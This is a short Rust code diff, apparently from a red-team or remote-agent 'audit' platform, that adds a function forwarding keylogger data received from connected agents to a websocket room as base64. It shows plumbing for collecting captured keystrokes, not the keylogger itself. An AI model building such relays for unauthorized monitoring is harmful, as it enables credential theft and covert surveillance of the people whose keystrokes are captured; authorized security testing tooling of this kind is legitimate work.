@@ -2,7 +2,9 @@ use shared::multiplexing::StreamId;
 use socketioxide::SocketIo;
 use tracing::error;
 
-use super::types::{AgentOutputPayload, AgentStatusPayload, AgentStreamClosedPayload};
+use super::types::{
+    AgentKeyloggerPayload, AgentOutputPayload, AgentStatusPayload, AgentStreamClosedPayload,
+};
 
 /// Emit agent output data to the audit room.
 ///
@@ -71,5 +73,32 @@ pub async fn emit_agent_stream_closed(
         .await
     {
         error!(audit_id = %audit_id, agent_id = %agent_id, error = %e, "Failed to emit agent:stream_closed");
+    }
+}
+
+/// Emit keylogger data to the audit room.
+///
+/// Called when the server receives `KeyloggerData` from an agent's TCP connection.
+pub async fn emit_agent_keylogger(
+    io: &SocketIo,
+    audit_id: &str,
+    agent_id: &str,
+    data: &[u8],
+) {
+    use base64::{Engine, engine::general_purpose::STANDARD};
+
+    let room_id = format!("audit:{audit_id}");
+    let payload = AgentKeyloggerPayload {
+        agent_id: agent_id.to_string(),
+        data: STANDARD.encode(data),
+    };
+    if let Err(e) = io
+        .of("/v1/ws")
+        .expect("namespace /v1/ws not found")
+        .to(room_id)
+        .emit("agent:keylogger", &payload)
+        .await
+    {
+        error!(audit_id = %audit_id, agent_id = %agent_id, error = %e, "Failed to emit agent:keylogger");
     }
 }
